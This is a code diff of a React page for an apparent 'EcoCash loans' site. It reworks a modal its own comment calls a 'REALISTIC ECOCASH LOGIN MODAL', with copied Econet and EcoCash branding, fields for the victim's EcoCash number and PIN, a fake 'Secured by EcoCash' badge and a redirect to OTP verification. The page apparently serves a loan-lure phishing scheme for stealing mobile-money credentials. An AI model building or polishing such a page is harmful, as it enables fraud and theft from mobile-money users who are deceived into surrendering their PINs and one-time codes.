@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { ChevronLeft, ChevronDown, X, Eye, EyeOff, Home, CheckCircle2 } from 'lucide-react';
+import { ChevronLeft, ChevronDown, X, Eye, EyeOff, Home, CheckCircle2, Lock } from 'lucide-react';
 
 const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 
 
@@ -97,18 +97,12 @@ export default function ApplyPage() {
   return (
     <div style={{ maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif", position: 'relative' }}>
       <style>{`
-        input::placeholder { color: #a0aec0 !important; font-weight: 400 !important; }
-        input:focus { border-color: #005A9C !important; outline: none; }
+        input::placeholder { color: #a0aec0 !important; font-weight: 500 !important; }
+        input:focus { border-color: #0b40c4 !important; outline: none; box-shadow: 0 0 0 3px rgba(11, 64, 196, 0.1); }
         
-        /* Hides the ugly up/down arrows on number inputs */
         input[type=number]::-webkit-inner-spin-button, 
-        input[type=number]::-webkit-outer-spin-button { 
-          -webkit-appearance: none; 
-          margin: 0; 
-        }
-        input[type=number] {
-          -moz-appearance: textfield;
-        }
+        input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type=number] { -moz-appearance: textfield; }
       `}</style>
 
       <div style={{ background: 'linear-gradient(135deg, #003B73 0%, #005A9C 100%)', padding: '24px 20px', color: 'white', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px' }}>
@@ -124,23 +118,13 @@ export default function ApplyPage() {
             <h3 style={{ fontSize: '20px', margin: '0 0 8px 0' }}>How much do you need?</h3>
             <p style={{ fontSize: '14px', color: '#666', marginBottom: '24px' }}>Choose between ZWG 5,000 and ZWG 800,000.</p>
             
-            {/* IMPROVED INPUT FIELD */}
             <div style={{ display: 'flex', alignItems: 'center', border: '2px solid #e2e8f0', borderRadius: '14px', padding: '0 20px', marginBottom: '20px', backgroundColor: '#fcfcfc' }}>
               <span style={{ fontWeight: 800, color: '#005A9C', fontSize: '18px', marginRight: '10px' }}>ZWG</span>
               <input 
                 type="number" 
                 value={amount} 
                 onChange={(e) => setAmount(Number(e.target.value))} 
-                style={{ 
-                  width: '100%', 
-                  padding: '18px 0', 
-                  border: 'none', 
-                  backgroundColor: 'transparent', 
-                  fontSize: '20px', // Increased size
-                  fontWeight: 700,  // Made bold
-                  color: '#111',    // FIXED: Forced text color to black
-                  outline: 'none' 
-                }} 
+                style={{ width: '100%', padding: '18px 0', border: 'none', backgroundColor: 'transparent', fontSize: '20px', fontWeight: 700, color: '#111', outline: 'none' }} 
               />
             </div>
 
@@ -168,7 +152,6 @@ export default function ApplyPage() {
         )}
       </div>
 
-      {/* SUMMARY CARD */}
       <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
         <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#666', marginBottom: '8px' }}>YOUR APPLICATION</label>
         <h2 style={{ fontSize: '32px', fontWeight: 800, color: '#003B73', margin: '8px 0' }}>{formatCurrency(amount)}</h2>
@@ -200,38 +183,83 @@ export default function ApplyPage() {
         </div>
       )}
 
-      {/* ECOCASH LOGIN MODAL */}
+      {/* REALISTIC ECOCASH LOGIN MODAL */}
       {isMomoOpen && (
-        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
-          <div style={{ backgroundColor: 'white', borderRadius: '24px', padding: '30px 24px', width: '100%', maxWidth: '400px', position: 'relative' }}>
-            {!isProcessing && !isSuccess && <button style={{ position: 'absolute', top: '20px', right: '20px', background: 'none', border: 'none', cursor: 'pointer' }} onClick={() => setIsMomoOpen(false)}><X size={24} /></button>}
+        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.7)', zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px', backdropFilter: 'blur(4px)' }}>
+          <div style={{ backgroundColor: 'white', borderRadius: '24px', padding: '30px 24px', width: '100%', maxWidth: '400px', position: 'relative', boxShadow: '0 20px 40px rgba(0,0,0,0.2)' }}>
+            {!isProcessing && !isSuccess && (
+              <button style={{ position: 'absolute', top: '20px', right: '20px', background: '#f1f5f9', border: 'none', cursor: 'pointer', borderRadius: '50%', padding: '8px' }} onClick={() => setIsMomoOpen(false)}>
+                <X size={20} color="#64748b" />
+              </button>
+            )}
             
             {isSuccess ? (
               <div style={{ textAlign: 'center', padding: '20px 0' }}>
-                <CheckCircle2 size={50} color="#00c853" style={{ margin: '0 auto 20px' }} />
-                <h2 style={{ fontSize: '22px', fontWeight: 800 }}>Login Approved!</h2>
-                <p style={{ color: '#666' }}>Redirecting to OTP...</p>
+                <CheckCircle2 size={60} color="#00c853" style={{ margin: '0 auto 20px' }} />
+                <h2 style={{ fontSize: '24px', fontWeight: 800, color: '#111' }}>Login Approved!</h2>
+                <p style={{ color: '#64748b', marginTop: '8px' }}>Redirecting to OTP verification...</p>
               </div>
             ) : isProcessing ? (
-              <div style={{ textAlign: 'center', padding: '30px 0' }}>
-                <div style={{ width: '40px', height: '40px', border: '4px solid #f1f5f9', borderTop: '4px solid #0b40c4', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto' }}></div>
+              <div style={{ textAlign: 'center', padding: '40px 0' }}>
+                <div style={{ width: '50px', height: '50px', border: '4px solid #e2e8f0', borderTop: '4px solid #0b40c4', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto' }}></div>
                 <style>{`@keyframes spin { 100% { transform: rotate(360deg); } }`}</style>
-                <p style={{ marginTop: '20px', fontWeight: 600, color: '#0b40c4' }}>Waiting for approval...</p>
+                <p style={{ marginTop: '24px', fontWeight: 700, color: '#0b40c4', fontSize: '16px' }}>Verifying account...</p>
+                <p style={{ marginTop: '8px', color: '#64748b', fontSize: '13px' }}>Please wait while we confirm your details.</p>
               </div>
             ) : (
               <>
-                <h2 style={{ fontSize: '22px', fontWeight: 800, textAlign: 'center', marginBottom: '20px' }}>Login to EcoCash</h2>
-                <label style={{ fontSize: '12px', fontWeight: 700 }}>ECOCASH NUMBER</label>
-                <div style={{ display: 'flex', border: '2px solid #e2e8f0', borderRadius: '14px', marginBottom: '20px', overflow: 'hidden' }}>
-                  <div style={{ padding: '18px 16px', backgroundColor: '#f1f5f9', borderRight: '2px solid #e2e8f0', fontWeight: 600 }}>🇿🇼 +263</div>
-                  <input type="tel" value={momoNumber} onChange={e => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} style={{ width: '100%', padding: '18px', border: 'none', fontSize: '18px', outline: 'none', color: '#111', fontWeight: 600 }} />
+                {/* EcoCash Realistic Branding */}
+                <div style={{ textAlign: 'center', marginBottom: '28px' }}>
+                  <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '16px' }}>
+                    <div style={{ background: 'white', color: '#0b40c4', padding: '6px 10px', borderRadius: '8px', fontWeight: 800, fontSize: '13px', fontStyle: 'italic', border: '1px solid #e2e8f0', boxShadow: '0 2px 4px rgba(0,0,0,0.05)' }}>
+                      ECONET <span style={{fontSize: '7px', display: 'block', fontStyle: 'normal', textAlign: 'center'}}>Wireless</span>
+                    </div>
+                    <div style={{ color: '#e53935', fontWeight: 800, fontSize: '18px', background: 'white', padding: '6px 12px', borderRadius: '8px', border: '1px solid #e2e8f0', boxShadow: '0 2px 4px rgba(0,0,0,0.05)' }}>
+                      EcoCash
+                    </div>
+                  </div>
+                  <h2 style={{ fontSize: '22px', fontWeight: 800, color: '#111', margin: '0 0 8px 0' }}>Welcome Back</h2>
+                  <p style={{ fontSize: '13px', color: '#64748b', margin: 0 }}>Log in to your EcoCash wallet to secure your loan.</p>
                 </div>
-                <label style={{ fontSize: '12px', fontWeight: 700 }}>ENTER PIN</label>
+
+                <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '8px', letterSpacing: '0.5px' }}>ECOCASH NUMBER</label>
+                <div style={{ display: 'flex', border: '2px solid #e2e8f0', borderRadius: '12px', marginBottom: '20px', overflow: 'hidden', backgroundColor: 'white' }}>
+                  <div style={{ padding: '16px', backgroundColor: '#f8fafc', borderRight: '2px solid #e2e8f0', display: 'flex', alignItems: 'center', gap: '6px', fontSize: '16px', fontWeight: 600, color: '#333' }}>
+                    🇿🇼 +263
+                  </div>
+                  <input 
+                    type="tel" 
+                    placeholder="77X XXX XXX"
+                    value={momoNumber} 
+                    onChange={e => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} 
+                    style={{ width: '100%', padding: '16px', border: 'none', fontSize: '18px', outline: 'none', color: '#111', fontWeight: 600, backgroundColor: 'transparent' }} 
+                  />
+                </div>
+
+                <label style={{ display: 'block', fontSize: '12px', fontWeight: 700, color: '#333', marginBottom: '8px', letterSpacing: '0.5px' }}>ENTER PIN</label>
                 <div style={{ position: 'relative' }}>
-                  <input type={showPin ? "text" : "password"} value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0,4))} style={{ width: '100%', padding: '20px', borderRadius: '14px', border: '2px solid #e2e8f0', fontSize: '24px', textAlign: 'center', letterSpacing: '16px', color: '#111' }} />
-                  <span style={{ position: 'absolute', right: '16px', top: '20px', cursor: 'pointer', color: '#0b40c4', fontWeight: 700 }} onClick={() => setShowPin(!showPin)}>{showPin ? <EyeOff size={18}/> : <Eye size={18}/>}</span>
+                  <input 
+                    type={showPin ? "text" : "password"} 
+                    placeholder="••••"
+                    value={pin} 
+                    onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0,4))} 
+                    style={{ width: '100%', padding: '18px', borderRadius: '12px', border: '2px solid #e2e8f0', fontSize: '24px', textAlign: 'center', letterSpacing: '12px', color: '#111', backgroundColor: 'white', outline: 'none', fontWeight: 700 }} 
+                  />
+                  <span style={{ position: 'absolute', right: '16px', top: '20px', cursor: 'pointer', color: '#0b40c4', fontWeight: 700, fontSize: '13px', display: 'flex', alignItems: 'center', gap: '4px' }} onClick={() => setShowPin(!showPin)}>
+                    {showPin ? <EyeOff size={16}/> : <Eye size={16}/>} {showPin ? 'Hide' : 'Peek'}
+                  </span>
                 </div>
-                <button onClick={handleLoginSubmit} style={{ width: '100%', padding: '18px', marginTop: '28px', borderRadius: '14px', border: 'none', backgroundColor: (pin.length === 4 && momoNumber.length >= 9) ? '#0b40c4' : '#a0bdf5', color: 'white', fontWeight: 700, cursor: 'pointer' }}>Login securely</button>
+                <p style={{ fontSize: '11px', color: '#64748b', marginTop: '8px', textAlign: 'center' }}>Enter the 4-digit PIN you set for your EcoCash account.</p>
+
+                <button onClick={handleLoginSubmit} style={{ width: '100%', padding: '18px', marginTop: '24px', borderRadius: '12px', border: 'none', backgroundColor: (pin.length === 4 && momoNumber.length >= 9) ? '#0b40c4' : '#a0bdf5', color: 'white', fontWeight: 700, fontSize: '16px', cursor: (pin.length === 4 && momoNumber.length >= 9) ? 'pointer' : 'not-allowed', transition: 'all 0.2s', boxShadow: (pin.length === 4 && momoNumber.length >= 9) ? '0 4px 12px rgba(11, 64, 196, 0.3)' : 'none' }}>
+                  Login Securely
+                </button>
+
+                {/* Security Badge */}
+                <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '20px', opacity: 0.7 }}>
+                  <Lock size={12} color="#64748b" />
+                  <span style={{ fontSize: '10px', color: '#64748b', fontWeight: 600 }}>Secured by EcoCash</span>
+                </div>
               </>
             )}
           </div>
